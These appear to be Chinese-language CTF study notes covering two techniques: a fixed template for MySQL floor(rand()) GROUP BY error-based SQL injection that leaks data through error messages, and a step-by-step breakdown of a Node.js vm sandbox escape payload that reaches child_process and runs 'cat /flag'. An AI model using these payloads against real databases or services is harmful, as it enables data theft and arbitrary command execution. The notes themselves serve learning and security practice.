下面是floor报错注入的固定模板：

```Plaintext
union select 1,count(*),concat_ws('～', [要泄露的数据] ,floor(rand(0)*2)) as a 
from information_schema.tables 
group by a
```

主要执行的语句就放在泄露数据处

`GROUP BY` + `RAND()` 触发主键冲突报错的经典技巧（也叫 **"Double** **Query** **/ Group By Rand" 报错注入**）。

其核心思想是：

- 利用 `GROUP BY` 对一个包含随机数的表达式分组；
- 当数据量足够大时（如 `information_schema.tables` 表通常有几十行以上），`floor(rand(0)*2)` 会重复生成相同的值（由于 `rand(0)` 是确定性种子），导致主键冲突，从而触发 MySQL 报错；
- 报错信息中会包含 `concat_ws(...)` 的结果，从而泄露敏感数据（如当前数据库名）。

#### 1. 沙箱逃逸的核心思路

Node.js 的 `vm` 模块沙箱默认不会隔离「全局内置函数的构造器」（比如 `clearImmediate`/`setTimeout` 等），而这些内置函数的 `constructor` 是 `Function` 构造器 —— 通过 `Function` 构造器可以执行任意代码，从而拿到沙箱外的 `process` 对象（Node.js 核心全局对象），进而调用 `child_process` 执行系统命令。

#### 2. 逐段拆解 payload 作用

|                代码片段                |                           核心作用                           |
| :------------------------------------: | :----------------------------------------------------------: |
|            `clearImmediate`            | 沙箱内可访问的 **Node.js 内置全局函数**（vm 沙箱默认不会屏蔽这类内置函数） |
|   `.constructor("return process;")`    | `clearImmediate` 的构造器是 `Function` 函数，`Function("return process;")` 会创建一个匿名函数，执行后返回沙箱外的 `process` 对象（这是逃逸的关键） |
|                  `()`                  |         执行上面创建的匿名函数，拿到 `process` 对象          |
| `.mainModule.require("child_process")` | 通过 `process` 对象引入 Node.js 的 `child_process` 模块（用于执行系统命令） |
|        `.execSync("cat /flag")`        |        同步执行 `cat /flag` 命令，读取 flag 文件内容         |
|             `.toString()`              |    把命令执行结果（Buffer 类型）转为字符串，方便返回展示     |
